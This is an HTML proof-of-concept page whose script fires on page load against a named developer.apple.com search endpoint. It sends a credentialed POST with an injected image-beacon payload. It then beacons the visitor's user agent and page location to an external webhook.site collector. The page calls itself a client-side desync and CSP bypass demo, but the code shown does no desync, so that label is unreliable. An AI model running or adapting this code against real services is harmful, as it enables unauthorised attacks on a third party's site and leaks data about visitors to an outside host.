<body>
  <h1>Apple Developer Client-Side Desync PoC</h1>
  <p>This page demonstrates a crafted request sent to the vulnerable endpoint and a CSP bypass attempt. Proof is sent to the webhook below:</p>
  <pre id="log">Running PoC…</pre>

  <script>
    // === إعدادات ===
    const WEBHOOK = "https://webhook.site/76de3122-9fc0-47d9-844c-1fb847ba7133";
    const TARGET = "https://developer.apple.com/search/services/v1/quick-links/";

    // حمولة بيكون بسيطة
    const payload = "<img src=" + WEBHOOK + "?poc=apple_test alt=x>";

    // خطوة 1: إرسال payload إلى الرابط المصاب
    fetch(TARGET, {
      method: "POST",
      headers: {"Content-Type": "application/x-www-form-urlencoded"},
      body: "payload=" + encodeURIComponent(payload),
      credentials: "include"
    })
    .then(res => res.text())
    .then(txt => {
      log("✅ Sent payload to: " + TARGET);
      log("Response snippet:\n" + txt.slice(0,200));
    })
    .catch(err => log("⚠️ Error sending payload: " + err));

    // خطوة 2: إرسال Proof للويبهوك مباشرة
    function sendProof() {
      const proof = {
        target: TARGET,
        proof: "Apple Unified PoC",
        ua: navigator.userAgent,
        loc: location.href,
        when: new Date().toISOString()
      };
      fetch(WEBHOOK, {
        method: "POST",
        mode: "no-cors",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(proof)
      });
      log("📤 Proof beacon sent to webhook.");
    }

    // util للعرض على الصفحة
    function log(msg) {
      const el = document.getElementById("log");
      el.textContent += "\n" + msg;
      console.log(msg);
    }

    sendProof();
  </script>
